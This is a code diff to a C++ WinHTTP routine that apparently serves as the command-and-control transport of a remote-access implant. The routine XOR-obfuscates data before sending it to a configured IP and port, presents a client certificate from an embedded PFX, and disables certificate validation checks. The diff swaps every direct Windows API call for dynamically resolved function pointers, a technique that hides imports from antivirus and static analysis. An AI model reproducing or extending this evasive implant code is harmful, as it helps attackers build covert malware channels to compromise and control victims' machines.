@@ -18,7 +18,7 @@
 
 #include "packet.h"
 #include "utils.h"
-
+#include "api.h"
 
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "winhttp.lib")
@@ -72,21 +72,22 @@ bool HttpsProto::httpRequest(char* data, int datasize) {
 	HCERTSTORE pfxStore;
 	PCCERT_CONTEXT pcontext = NULL, clientCertContext = NULL;
 
-	hSession = WinHttpOpen(MY_USERAGENT,WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS, 0);
+	hSession = lpWinHttpOpen(MY_USERAGENT,WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS, 0);
 	if (!hSession) 
 	{
 		runLog("%s:%s error code:%d\r\n", __FILE__, __FUNCTION__, GetLastError());
 		goto _END;
 	}
 
-	hConnect = WinHttpConnect(hSession, m_ip, m_port, 0);
+	hConnect = lpWinHttpConnect(hSession, m_ip, m_port, 0);
 	if (!hConnect) 
 	{
 		runLog("%s:%s error code:%d\r\n", __FILE__, __FUNCTION__, GetLastError());
 		goto _END;
 	}
 
-	hRequest = WinHttpOpenRequest(hConnect, m_action.c_str(), m_app ,NULL, WINHTTP_NO_REFERER,(LPCWSTR*)&szAcceptTypes,WINHTTP_FLAG_SECURE);
+	hRequest = lpWinHttpOpenRequest(hConnect, m_action.c_str(), m_app ,NULL, WINHTTP_NO_REFERER,
+		(LPCWSTR*)&szAcceptTypes,WINHTTP_FLAG_SECURE);
 	if (!hConnect)
 	{
 		runLog("%s:%s error code:%d\r\n", __FILE__, __FUNCTION__, GetLastError());
@@ -102,7 +103,7 @@ bool HttpsProto::httpRequest(char* data, int datasize) {
 	// Convert a .pfx or .p12 file image to a Certificate store
 	PFX.pbData = (BYTE*)file;
 	PFX.cbData = filesize;
-	pfxStore = ::PFXImportCertStore(&PFX, pszPassWord, 0);
+	pfxStore = lpPFXImportCertStore(&PFX, pszPassWord, 0);
 	if (NULL == pfxStore)
 	{
 		runLog("%s:%s error code:%d\r\n", __FILE__, __FUNCTION__, GetLastError());
@@ -110,25 +111,25 @@ bool HttpsProto::httpRequest(char* data, int datasize) {
 	}
 
 
-	while (pcontext = ::CertEnumCertificatesInStore(pfxStore, pcontext)) {
+	while (pcontext = lpCertEnumCertificatesInStore(pfxStore, pcontext)) {
 
-		clientCertContext = ::CertDuplicateCertificateContext(pcontext); // CertEnumCertificatesInStore frees its passed in pcontext !
+		clientCertContext = lpCertDuplicateCertificateContext(pcontext); // CertEnumCertificatesInStore frees its passed in pcontext !
 
-		ret = ::WinHttpSetOption(hRequest, WINHTTP_OPTION_CLIENT_CERT_CONTEXT, (LPVOID)clientCertContext, sizeof(CERT_CONTEXT));
+		ret = lpWinHttpSetOption(hRequest, WINHTTP_OPTION_CLIENT_CERT_CONTEXT, (LPVOID)clientCertContext, sizeof(CERT_CONTEXT));
 		if (FALSE == ret)
 		{
 			runLog("%s:%s error code:%d\r\n", __FILE__, __FUNCTION__, GetLastError());
 
-			CertCloseStore(pfxStore, 0);
-			CertFreeCertificateContext(clientCertContext);
+			lpCertCloseStore(pfxStore, 0);
+			lpCertFreeCertificateContext(clientCertContext);
 
 			goto _END;
 		}
 		else
 		{
 			//success
-			CertCloseStore(pfxStore, 0);
-			CertFreeCertificateContext(clientCertContext);
+			lpCertCloseStore(pfxStore, 0);
+			lpCertFreeCertificateContext(clientCertContext);
 			break;
 		}
 	}
@@ -141,7 +142,7 @@ bool HttpsProto::httpRequest(char* data, int datasize) {
 
 		std::wstring cl;
 		BuildContentLength(datasize, cl);
-		ret = WinHttpAddRequestHeaders(hRequest, cl.c_str(), -1L, 0);
+		ret = lpWinHttpAddRequestHeaders(hRequest, cl.c_str(), -1L, 0);
 		if (!ret) {
 			break;
 		}
@@ -151,7 +152,7 @@ bool HttpsProto::httpRequest(char* data, int datasize) {
 		//ret = WinHttpAddRequestHeaders(hRequest, gzip.c_str(), -1L, 0);
 
 		// no retry on success, possible retry on failure
-		ret = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 0, 0, 0, NULL);
+		ret = lpWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 0, 0, 0, NULL);
 		if (ret == FALSE)
 		{
 			ret = GetLastError();
@@ -165,7 +166,7 @@ bool HttpsProto::httpRequest(char* data, int datasize) {
 			{
 				DWORD dwFlags =SECURITY_FLAG_IGNORE_UNKNOWN_CA |SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
 					SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
-				ret = WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+				ret = lpWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
 				if (ret)
 				{
 				}
@@ -188,7 +189,7 @@ bool HttpsProto::httpRequest(char* data, int datasize) {
 			{
 				xor_crypt(data, datasize);
 
-				ret = WinHttpWriteData(hRequest, data, datasize, &dwSize);
+				ret = lpWinHttpWriteData(hRequest, data, datasize, &dwSize);
 				if (ret == 0) {
 					bResults = FALSE;
 					
@@ -200,14 +201,14 @@ bool HttpsProto::httpRequest(char* data, int datasize) {
 	} while (retry);
 
 	if (bResults) {
-		bResults = WinHttpReceiveResponse(hRequest, NULL);
+		bResults = lpWinHttpReceiveResponse(hRequest, NULL);
 	}
 
 	if (bResults)
 	{
 		vector<char*> response;
 		int respLen = 0;
-		ret = WinHttpQueryDataAvailable(hRequest, &dwSize);
+		ret = lpWinHttpQueryDataAvailable(hRequest, &dwSize);
 		if (dwSize > 0 && ret) {
 			int freesize = BUFFER_SIZE;
 			char* databuf = new char[BUFFER_SIZE];
@@ -217,11 +218,11 @@ bool HttpsProto::httpRequest(char* data, int datasize) {
 			{
 				if (dwSize > freesize)
 				{
-					ret = WinHttpReadData(hRequest, databuf, freesize, &dwRead);
+					ret = lpWinHttpReadData(hRequest, databuf, freesize, &dwRead);
 				}
 				else
 				{
-					ret = WinHttpReadData(hRequest, databuf, dwSize, &dwRead);
+					ret = lpWinHttpReadData(hRequest, databuf, dwSize, &dwRead);
 				}
 				if (ret == 0 || dwRead <= 0)
 				{
@@ -238,7 +239,7 @@ bool HttpsProto::httpRequest(char* data, int datasize) {
 					response.push_back(databuf);
 				}
 
-				ret = WinHttpQueryDataAvailable(hRequest, &dwSize);
+				ret = lpWinHttpQueryDataAvailable(hRequest, &dwSize);
 			}
 		}
 
@@ -265,17 +266,17 @@ bool HttpsProto::httpRequest(char* data, int datasize) {
 		runLog("%s %s Error %d has occurred.\n",__FILE__ ,__FUNCTION__, GetLastError());
 	}
 
-	WinHttpSetStatusCallback(hSession,NULL,WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS,NULL);
+	lpWinHttpSetStatusCallback(hSession,NULL,WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS,NULL);
 
 _END:
 	if (hRequest) {
-		WinHttpCloseHandle(hRequest);
+		lpWinHttpCloseHandle(hRequest);
 	}
 	if (hConnect) {
-		WinHttpCloseHandle(hConnect);
+		lpWinHttpCloseHandle(hConnect);
 	}
 	if (hSession) {
-		WinHttpCloseHandle(hSession);
+		lpWinHttpCloseHandle(hSession);
 	}
 	
 	return bResults;
